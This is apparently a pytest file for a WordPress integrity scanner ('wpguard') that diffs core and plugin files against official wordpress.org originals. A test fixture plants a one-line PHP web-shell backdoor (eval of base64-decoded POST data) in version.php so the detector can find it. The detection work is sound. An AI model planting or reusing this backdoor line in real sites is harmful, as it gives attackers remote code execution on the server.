import io
import json
import zipfile

from wpguard import diffs

ORIGINAL = "<?php\n// wp-includes/version\n$wp_version = '6.9';\necho 'ok';\n"
INFECTED = ORIGINAL + "eval(base64_decode($_POST['x']));\n"


def make_zip(members):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for name, text in members.items():
            z.writestr(name, text)
    return zipfile.ZipFile(io.BytesIO(buf.getvalue()))


def prepare(site, fake_wp, monkeypatch):
    (site / "wp-includes").mkdir()
    (site / "wp-includes/version.php").write_text(INFECTED)
    (site / "wp-content/plugins/akismet/akismet.php").write_text("<?php // changed")
    fake_wp.responses[("core", "version")] = (0, "6.9\n", "")
    fake_wp.responses[("core", "verify-checksums")] = (
        1,
        "",
        "Warning: File doesn't verify against checksum: wp-includes/version.php\n",
    )
    fake_wp.responses[("plugin", "list")] = (0, json.dumps([{"name": "akismet", "version": "5.3"}]), "")
    fake_wp.responses[("plugin", "verify-checksums")] = (
        0,
        json.dumps(
            [{"plugin_name": "akismet", "file": "akismet.php", "message": "File doesn't verify against checksum"}]
        ),
        "",
    )
    zips = {
        "https://wordpress.org/wordpress-6.9.zip": make_zip({"wordpress/wp-includes/version.php": ORIGINAL}),
        "https://downloads.wordpress.org/plugin/akismet.5.3.zip": make_zip(
            {"akismet/akismet.php": "<?php // original"}
        ),
    }
    monkeypatch.setattr(diffs, "original_zip", zips.get)


def test_modified_lists_core_and_plugin_files(site, fake_wp, monkeypatch):
    prepare(site, fake_wp, monkeypatch)
    mods = diffs.modified(site)
    assert [(m["kind"], m["slug"], m["rel"]) for m in mods] == [
        ("core", "wordpress", "wp-includes/version.php"),
        ("plugin", "akismet", "akismet.php"),
    ]


def test_diff_shows_injected_lines(site, fake_wp, ns, monkeypatch):
    prepare(site, fake_wp, monkeypatch)
    rep = diffs.diff(site, ns("diff"))
    assert [h["what"] for h in rep.hits] == ["wordpress@6.9/wp-includes/version.php", "akismet@5.3/akismet.php"]
    assert rep.hits[0]["why"] == "+1 -0 lines vs the official file"
    text = "\n".join(rep.lines)
    assert "+eval(base64_decode($_POST['x']));" in text


def test_diff_filters(site, fake_wp, ns, monkeypatch):
    prepare(site, fake_wp, monkeypatch)
    assert len(diffs.diff(site, ns("diff", "--core")).hits) == 1
    only_plugin = diffs.diff(site, ns("diff", "--plugin", "akismet"))
    assert any("akismet" in h["what"] for h in only_plugin.hits)


def test_diff_original_unavailable_and_clean(site, fake_wp, ns, monkeypatch):
    prepare(site, fake_wp, monkeypatch)
    monkeypatch.setattr(diffs, "original_zip", lambda _url: None)
    assert "cannot diff" in diffs.diff(site, ns("diff")).hits[0]["why"]
    fake_wp.responses.clear()
    rep = diffs.diff(site, ns("diff"))
    assert rep.hits == []
    assert "match wordpress.org" in rep.lines[0]


def test_unified_helper():
    assert diffs.unified(b"a\nb\n", b"a\nc\n", "f.php")[0] == "--- original/f.php"


def test_original_zip_caches(monkeypatch, tmp_path):
    monkeypatch.setattr(diffs, "CACHE", tmp_path)
    calls = []
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("a/b", "x")
    monkeypatch.setattr(diffs, "fetch", lambda url: calls.append(url) or buf.getvalue())
    assert diffs.original_zip("https://x/y.zip").read("a/b") == b"x"
    assert diffs.original_zip("https://x/y.zip").read("a/b") == b"x"
    assert len(calls) == 1  # second read came from the cache
    monkeypatch.setattr(diffs, "fetch", lambda url: None)
    assert diffs.original_zip("https://x/other.zip") is None
